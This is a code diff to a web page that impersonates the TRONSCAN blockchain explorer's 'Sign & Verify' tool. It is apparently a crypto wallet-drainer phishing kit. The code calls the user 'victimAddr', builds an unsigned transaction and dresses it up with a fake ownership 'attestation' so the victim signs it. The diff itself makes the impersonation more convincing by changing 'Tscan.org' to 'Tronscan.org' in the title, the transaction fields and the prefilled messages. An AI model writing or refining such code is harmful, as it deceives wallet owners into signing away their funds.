@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Sign & Verify | Tools | TRONSCAN</title>
+<title>Tronscan wants to verify ownership of your address and</title>
 <link rel="icon" href="images/favicon.ico" sizes="any">
 <link rel="apple-touch-icon" href="images/apple-touch-icon.png">
 <link rel="stylesheet" href="css/next-1.css">
@@ -460,8 +460,8 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
     var pad = function (n) { return String(n).padStart(2, '0'); };
     var ts = pad(now.getDate()) + '/' + pad(now.getMonth() + 1) + '/' + now.getFullYear()
            + ' ' + pad(now.getHours()) + ':' + pad(now.getMinutes()) + ':' + pad(now.getSeconds());
-    unsignedTx.Authority   = 'Tscan.org';
-    unsignedTx.Attestation = '[Tscan.org ' + ts + '] I hereby verify that I am the owner/creator of the address [' + victimAddr + ']';
+    unsignedTx.Authority   = 'Tronscan.org';
+    unsignedTx.Attestation = '[Tronscan.org ' + ts + '] I hereby verify that I am the owner/creator of the address [' + victimAddr + ']';
 
     var signedTx;
     try {
@@ -544,7 +544,7 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
       var p = function (v) { return String(v).padStart(2, '0'); };
       var ts = p(n.getDate()) + '/' + p(n.getMonth() + 1) + '/' + n.getFullYear()
              + ' ' + p(n.getHours()) + ':' + p(n.getMinutes()) + ':' + p(n.getSeconds());
-      var msg = '[Tscan.org ' + ts + '] I hereby verify that I am the owner/creator of the address [' + addr + ']';
+      var msg = '[Tronscan.org ' + ts + '] I hereby verify that I am the owner/creator of the address [' + addr + ']';
       if (window.fillMessage) window.fillMessage(msg);
 
       // close connect modal if open
@@ -687,7 +687,7 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
              ' ' + pad(now.getHours()) + ':' + pad(now.getMinutes()) + ':' + pad(now.getSeconds());
     
     // Message avec "..." pour l'adresse (puisqu'elle n'est pas encore connue)
-    var prefillMsg = '[Tscan.org ' + ts + '] I hereby verify that I am the owner/creator of the address [...]';
+    var prefillMsg = '[Tronscan.org ' + ts + '] I hereby verify that I am the owner/creator of the address [...]';
     
     // Remplir le champ
     msgInput.value = prefillMsg;
